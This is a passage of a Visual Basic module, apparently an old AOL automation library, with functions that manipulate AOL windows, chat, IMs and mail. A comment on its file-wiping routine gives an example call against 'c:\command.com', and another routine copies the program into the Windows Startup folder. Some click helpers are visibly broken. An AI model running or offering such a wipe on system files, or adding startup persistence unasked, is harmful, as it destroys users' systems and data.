AOLStatic& = FindWindowEx(AOLChild&, 0&, "_AOL_Static", vbNullString)
Call SendMessageByString(AOLStatic&, WM_SETTEXT, 0&, text$)
End Function

Public Function ChangeCopyTo(text As String)
'This Changes Copy To: on Write mail to whatever
'Call ChangeCopyTo("AssHole:")
Dim AOLStatic As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLStatic& = FindWindowEx(AOLChild&, 0&, "_AOL_Static", vbNullString)
AOLStatic& = FindWindowEx(AOLChild&, AOLStatic&, "_AOL_Static", vbNullString)
Call SendMessageByString(AOLStatic&, WM_SETTEXT, 0&, text$)
End Function

Public Function ChangeSubject(text As String)
'This Changes where it says Subject on write mail
'Call ChangeSubject ("Topic:")
Dim i As Long
Dim AOLStatic As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLStatic& = FindWindowEx(AOLChild&, 0&, "_AOL_Static", vbNullString)
For i& = 1& To 2&
    AOLStatic& = FindWindowEx(AOLChild&, AOLStatic&, "_AOL_Static", vbNullString)
Next i&
Call SendMessageByString(AOLStatic&, WM_SETTEXT, 0&, text$)
End Function

Public Function HidePrefrences()
'hides prefrences window
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Preferences")
Call ShowWindow(AOLChild&, SW_HIDE)
End Function

Public Function ShowPrefrences()
'shows prefrences window
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Preferences")
Call ShowWindow(AOLChild&, SW_SHOW)
End Function

Public Function ChangePrefrencesCaption(text As String)
'Call ChangePrefrencesCaption("NewCAPhere")
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Preferences")
Call SendMessageByString(AOLChild&, WM_SETTEXT, 0&, text$)
End Function

Public Function CloseFavorites()
'close favorite places window
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Favorite Places")
Call SendMessage(AOLChild&, WM_CLOSE, 0&, 0&)
End Function

Public Function HideFavorites()
'hides favorite places window
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Favorite Places")
Call ShowWindow(AOLChild&, SW_HIDE)
End Function

Public Function MaximizeFavorites()
'maximizes favorite window
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Favorite Places")
Call ShowWindow(AOLChild&, SW_MAXIMIZE)
End Function

Public Function MinimizeFavorites()
'minimizes favorites window
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Favorite Places")
Call ShowWindow(AOLChild&, SW_MINIMIZE)
End Function

Public Function ShowFavorites()
'shows favorites window
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Favorite Places")
Call ShowWindow(AOLChild&, SW_SHOW)
End Function

Public Function ChangeFavoritesCaption(text As String)
'Call ChangeFavoritesCaption("Source Ownz Favorites")
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Favorite Places")
Call SendMessageByString(AOLChild&, WM_SETTEXT, 0&, text$)
End Function

Public Function CloseConnectionLog()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long


AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Connection Log")
Call SendMessage(AOLChild&, WM_CLOSE, 0&, 0&)
End Function


Public Function AutoCloseConnectionLog() As Long
'in timer
'If autocloseconnectionlog <> 0& then
'call closeconnectionlog
'else
'end if
Dim counter As Long
Dim AOLView As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
AOLView& = FindWindowEx(AOLChild&, 0&, "_AOL_View", vbNullString)
Do While (counter& <> 100&) And (AOLView& = 0&): DoEvents
    AOLChild& = FindWindowEx(MDIClient&, AOLChild&, "AOL Child", vbNullString)
    AOLView& = FindWindowEx(AOLChild&, 0&, "_AOL_View", vbNullString)
    If AOLView& Then Exit Do
    counter& = Val(counter&) + 1&
Loop
If Val(counter&) < 100& Then
    AutoCloseConnectionLog& = AOLChild&
    Exit Function
End If
End Function

Public Function StayOnline() As Long
'in timer
'If StayOnline <> 0& then
'call stayonlineclickno
'else
'end if
Dim counter As Long
Dim AOLIcon As Long
Dim AOLStatic As Long
Dim AOLModal As Long
AOLModal& = FindWindow("_AOL_Modal", vbNullString)
AOLStatic& = FindWindowEx(AOLModal&, 0&, "_AOL_Static", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, AOLIcon&, "_AOL_Icon", vbNullString)
Do While (counter& <> 100&) And (AOLStatic& = 0& Or AOLIcon& = 0&): DoEvents
    AOLModal& = FindWindowEx(AOLModal&, AOLModal&, "_AOL_Modal", vbNullString)
    AOLStatic& = FindWindowEx(AOLModal&, 0&, "_AOL_Static", vbNullString)
    AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
    AOLIcon& = FindWindowEx(AOLModal&, AOLIcon&, "_AOL_Icon", vbNullString)
    If AOLStatic& And AOLIcon& Then Exit Do
    counter& = Val(counter&) + 1&
Loop
If Val(counter&) < 100& Then
    StayOnline& = AOLModal&
    Exit Function
End If
End Function
Public Function StayOnlineClickNo()
Dim AOLIcon As Long
Dim AOLModal As Long
AOLModal& = FindWindow("_AOL_Modal", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ConfirmOffline() As Long
'finds window if u can logged of and clicks ok
'in timer
'If ConfirmOffline <> 0& then
'call Offlineok
'else
'end if
Dim counter As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLEdit As Long
Dim RICHCNTL2 As Long
Dim AOLStatic2 As Long
Dim richcntl As Long
Dim AOLStatic As Long
Dim AOLGlyph As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
AOLGlyph& = FindWindowEx(AOLChild&, 0&, "_AOL_Glyph", vbNullString)
AOLStatic& = FindWindowEx(AOLChild&, 0&, "_AOL_Static", vbNullString)
richcntl& = FindWindowEx(AOLChild&, 0&, "RICHCNTL", vbNullString)
richcntl& = FindWindowEx(AOLChild&, richcntl&, "RICHCNTL", vbNullString)
AOLStatic2& = FindWindowEx(AOLChild&, AOLStatic&, "_AOL_Static", vbNullString)
RICHCNTL2& = FindWindowEx(AOLChild&, richcntl&, "RICHCNTL", vbNullString)
AOLEdit& = FindWindowEx(AOLChild&, 0&, "_AOL_Edit", vbNullString)
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 3&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Do While (counter& <> 100&) And (AOLGlyph& = 0& Or AOLStatic& = 0& Or richcntl& = 0& Or AOLStatic2& = 0& Or RICHCNTL2& = 0& Or AOLEdit& = 0& Or AOLIcon& = 0&): DoEvents
    AOLChild& = FindWindowEx(MDIClient&, AOLChild&, "AOL Child", vbNullString)
    AOLGlyph& = FindWindowEx(AOLChild&, 0&, "_AOL_Glyph", vbNullString)
    AOLStatic& = FindWindowEx(AOLChild&, 0&, "_AOL_Static", vbNullString)
    richcntl& = FindWindowEx(AOLChild&, 0&, "RICHCNTL", vbNullString)
    richcntl& = FindWindowEx(AOLChild&, richcntl&, "RICHCNTL", vbNullString)
    AOLStatic2& = FindWindowEx(AOLChild&, AOLStatic&, "_AOL_Static", vbNullString)
    RICHCNTL2& = FindWindowEx(AOLChild&, richcntl&, "RICHCNTL", vbNullString)
    AOLEdit& = FindWindowEx(AOLChild&, 0&, "_AOL_Edit", vbNullString)
    AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
    For i& = 1& To 3&
        AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
    Next i&
    If AOLGlyph& And AOLStatic& And richcntl& And AOLStatic2& And RICHCNTL2& And AOLEdit& And AOLIcon& Then Exit Do
    counter& = Val(counter&) + 1&
Loop
If Val(counter&) < 100& Then
    ConfirmOffline& = AOLChild&
    Exit Function
End If
End Function

Public Function OfflineOK()
'buggy..not perfect
Dim i As Long
Dim AOLIcon As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "The Connection Failed")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 3&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Sub ClearClipboard()
'Clears the clipboard
'Call ClearClipboard
On Error GoTo Error
Clipboard.Clear
Exit Sub
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Sub

Public Sub ClipboardCopy(text As String)
'Copies text to the clipboard
'Call Clipboardcopy("NewText")
'or possibly
'Call Clipboardcopy(text1.text)
On Error GoTo Error
Clipboard.Clear
Clipboard.SetText text$
Exit Sub
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Sub

Function ClipboardGet()
'Gets the copied text from the clipboard
'Text1.text=ClipBoardGet
On Error GoTo Error
ClipboardGet = Clipboard.GetText
Exit Function
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Function


Function GetAppVersion()
Dim appversion As Long
'This will retrieve the current version of your application
On Error GoTo Error
appversion = App.Major & "." & App.Minor & "." & App.Revision
Exit Function
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Function

Function GetAppName(ShowEXE As Boolean)
'This will get the application's .exe name
On Error GoTo Error
GetAppName = App.EXEName
If ShowEXE = True Then
GetAppName = GetAppName & ".exe"
End If
Exit Function
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Function

Function GetAppPath()
'This will get the application's current path
On Error GoTo Error
GetAppPath = App.Path
Exit Function
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Function

Function GetAppDescription()
'This will get the application's file description
On Error GoTo Error
GetAppDescription = App.FileDescription
Exit Function
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Function

Function GetAppCopyRight()
'This will get the application's copyright
On Error GoTo Error
GetAppCopyRight = App.LegalCopyright
Exit Function
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Function

Function GetAppComment()
'This will get the application's comment
On Error GoTo Error
GetAppComment = App.Comments
Exit Function
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Function

Function GetAppTitle()
'This will get the application's title
On Error GoTo Error
GetAppTitle = App.Title
Exit Function
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Function

Function GetAppCompanyName()
'This will get the application's company name
On Error GoTo Error
GetAppCompanyName = App.CompanyName
Exit Function
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Function

Function GetAppProductName()
'This will get the application's product name
On Error GoTo Error
GetAppProductName = App.ProductName
Exit Function
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Function
Public Sub AddToStartupDir()
'Add your application to the windows startup folder
On Error GoTo Error
FileCopy App.Path & "\" & App.EXEName & ".EXE", Mid$(App.Path, 1, 3) & "WINDOWS\START MENU\PROGRAMS\STARTUP\" & App.EXEName & ".EXE"
Exit Sub
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Sub

Function PasswordLock(password As String)
'This will create an input box to create a simple password protection
On Error GoTo Error
Dim xtra As String
Start:
xtra$ = InputBox("Please enter the password.", "Password Lock")
If xtra$ = password$ Then
MsgBox "Correct Password!", vbExclamation, "Password Lock"
Else
  If MsgBox("Incorrect Password!  Would you like to try again?", 48 + vbYesNo, "Password Lock") = vbYes Then
  GoTo Start
  Else
  End
  End If
End If
Exit Function
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Function


Public Sub PrintBlankPage()
'Print a blank page out of a printer
On Error GoTo Error
Printer.NewPage
Exit Sub
Error:  MsgBox Err.Description, vbExclamation, "Error"
End Sub

Sub DestroyFile(sFileName As String)
'Destroys A File, FULLPROOF
'Call DestryFile ("c:\command.com")
    Dim Block1 As String, Block2 As String, Blocks As Long
    Dim hFileHandle As Integer, iLoop As Long, offset As Long
    'Create two buffers with a specified 'wi
    'pe-out' characters
    Const BLOCKSIZE = 4096
    Block1 = String(BLOCKSIZE, "X")
    Block2 = String(BLOCKSIZE, " ")
    'Overwrite the file contents with the wi
    'pe-out characters
    hFileHandle = FreeFile
    Open sFileName For Binary As hFileHandle
    Blocks = (LOF(hFileHandle) \ BLOCKSIZE) + 1


    For iLoop = 1 To Blocks
        offset = Seek(hFileHandle)
        Put hFileHandle, , Block1
        Put hFileHandle, offset, Block2
    Next iLoop
    Close hFileHandle
    'Now you can delete the file, which cont
    'ains no sensitive data
    Kill sFileName
End Sub
 
Public Function ChangeChatRoomCap(text As String)
'ex: Call ChangeChatRoomCap("newname")
'where it says vb6 you need to change that to the current chatroom
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "vb6")
Call SendMessageByString(AOLChild&, WM_SETTEXT, 0&, text$)
End Function


Public Function ChatSend(text As String)
'Send chat to chatroom
'Call Sendchat("source ownz")
Dim richcntl As Long
richcntl& = FindWindowEx(FindChatRoom(), 0&, "RICHCNTL", vbNullString)
richcntl& = FindWindowEx(FindChatRoom(), richcntl&, "RICHCNTL", vbNullString)
Call SendMessageByString(richcntl&, WM_SETTEXT, 0&, text$)
Call SendMessageByNum(richcntl&, WM_CHAR, 13, 0&)
End Function
Public Function ChatClear(Room As String)
'this will clear the aol chat text
'ex: Call ChatClear("roomnametoclear")
'if you were in vb6, and u wanted to clear text in there...
'Call ChatClear("vb6")
Dim richcntl As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", Room$)
richcntl& = FindWindowEx(AOLChild&, 0&, "RICHCNTL", vbNullString)
Call SendMessageByString(richcntl&, WM_SETTEXT, 0&, "")
End Function

Public Function ClickPeopleDownArrow()
'on toolbar
Dim i As Long
Dim AOLIcon As Long
Dim aoltoolbar2 As Long
Dim AOLToolbar As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
AOLToolbar& = FindWindowEx(AOLFrame&, 0&, "AOL Toolbar", vbNullString)
aoltoolbar2& = FindWindowEx(AOLToolbar&, 0&, "_AOL_Toolbar", vbNullString)
AOLIcon& = FindWindowEx(aoltoolbar2&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 3&
    AOLIcon& = FindWindowEx(aoltoolbar2&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickAnyIcon()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long


'BIG UPS TO GRAVITY...thanx for help man!!!
'okay at the end of your coding where u want to click
'a button/icon all you have to do is add this to the
'end of your work
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)
'that will click it and release it...works perfectly
End Function

Public Function ClickSendIM()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long


'when your having a conversation with someone, this
'clicks that send button
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 9&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)
End Function

Public Function ClickCancelIM()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long


'when your having a conversation with someone, this
'clicks the cancel button
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 13&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)
End Function

Public Function ClickProfileIM()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'when your having a conversation with someone, this
'clicks the Get Profile button
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
AOLButton& = FindWindowEx(AOLChild&, 0&, "_AOL_Button", vbNullString)
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)
End Function

Public Function ClickNotifyAolIM()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'when talking with someone, this clicks the notify button
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", vbNullString)
AOLButton& = FindWindowEx(AOLChild&, 0&, "_AOL_Button", vbNullString)
AOLButton& = FindWindowEx(AOLChild&, AOLButton&, "_AOL_Button", vbNullString)
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)
End Function

Public Function ClickSendInChat()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'when in chat this clicks the send button
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "vb6")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 4&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function ClickAwayNotice()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'on your buddylist, this clicks away notice
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Buddy List")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 3&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function ClickSetupBlist()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'clicks setup button on your buddylist
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Buddy List")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 4&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function ClickHelpBlist()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'this clicks the help button on your buddylist
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Buddy List")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 5&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function ClickSendImBlist()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'This clicks the Send IM button on your buddylist
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Buddy List")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function ClickChatBlist()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'clicks the chat button on your buddylist
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Buddy List")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function ClickLocateBlist()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'clicks locate button on blist
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Buddy List")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 2&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function


Public Function MailSend()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'clicks the Send Button on Write Mail
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 17&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function MailSendLater()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'clicks the send later button on write mail
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 18&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function


Public Function MailAddyBook()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'clicks the addy book button on write mail
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
